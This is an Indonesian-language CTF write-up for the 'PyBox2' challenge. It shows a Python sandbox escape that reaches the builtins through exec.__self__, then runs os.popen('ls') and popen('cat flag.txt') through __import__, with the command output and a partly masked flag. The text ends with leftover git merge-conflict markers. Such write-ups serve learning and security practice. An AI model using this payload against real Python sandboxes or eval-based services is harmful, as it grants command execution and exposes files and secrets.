<H1>PyBox2</H1>
<H5>Tools: Terminal, bpython</H5>
Untuk menyelesaikan masalah ini kita harus mempelejari atau mencari tahu method atau attributes dari class compile atau exec. Seperti yang sudah di berikan di hint kita bisa menggunakan 

```python
compile.__self__
```
atau

```python
exec.__self__
```
dengan menggunakan bpython sebuah command lines tools terminal untuk python interactive, saya mencoba untuk mengetahui method dati class `exec`. Kita bisa mencari tahu dengan function `dir()`. seperti ini
```python
>>> dir(exec.__self__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'C
onnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception', 'False', 'FileExistsError'
, 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryEr
ror', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'Ove
rflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration
', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeErro
r', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader_
_', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'com
plex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'hel
p', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'pri
nt', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```
dari banyaknya method dari `exec.__self__` saya memilih untuk memakai yang paling sering saya gunakan dalam ctf yaitu `__import__`. dengan begitu payload pertama akan menjadi seperti ini
```python
exec.__self__.__import__("os").popen("ls").read()
```
payload di atas bisa di baca juga seperti ini
```python
import os
#code dibawah akan execute ls dan menjadikan output nya string
os.popen("ls").read
```
output dari code diatas adalah
```bash
Dockerfile
README.md
flag.txt
logo
main.py
makefile
payload
solve.py
```
dengan begitu kita tinggal execute `cat` untuk membaca flag.txt
```python
exec.__self__.__import__("os").popen("cat flag.txt").read()
```
dengan output:
```
TCP1P{******************************_get__import__}
```
note:* hanya untuk menutupi full flag

<<<<<<< HEAD
opini: menurut saya gunanya `__self__` adalah untuk meng-akses class yang ada di dalam scope mirip penggunaan `this` dalam javascript
=======
opini: menurut saya gunanya `__self__` adalah untuk meng-akses class yang ada di dalam scope mirip penggunaan `this` dalam javascript
>>>>>>> a3bd8ef (gk tahu)
